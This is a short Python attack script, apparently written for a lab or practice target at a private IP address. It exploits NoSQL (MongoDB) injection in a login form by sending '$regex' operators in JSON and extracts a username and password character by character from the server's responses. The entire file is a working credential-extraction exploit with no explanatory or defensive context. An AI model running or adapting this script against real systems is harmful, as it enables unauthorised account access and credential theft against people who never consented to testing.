import requests
import string

url = 'http://192.168.185.136:5000/login'

charset = string.ascii_letters + string.digits

def enumerate_username():
    username = ""
    while True:
        for char in charset:
            payload = {
                "username": {"$regex": f"^{username + char}"},
                "password": {"$regex": "^[0-9a-fA-F]+$"}
            }
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                username += char
                print(f"Found username: {username}")
                break
        if len(username) > 0 and response.status_code != 200:
            return username

def enumerate_password(username):
    password = ""
    while True:
        for char in charset:
            payload = {
                "username": username,
                "password": {"$regex": f"^{password + char}[0-9a-fA-F]*$"}
            }
            response = requests.post(url, json=payload)
            if response.status_code == 200:
                password += char
                print(f"Found password: {password}")
                break
        if len(password) > 0 and response.status_code != 200:
            return password

print("Enumerating username...")
username = enumerate_username()
print("Enumerating password...")
password = enumerate_password(username)
print(f"Found username: {username}")
print(f"Found password: {password}")
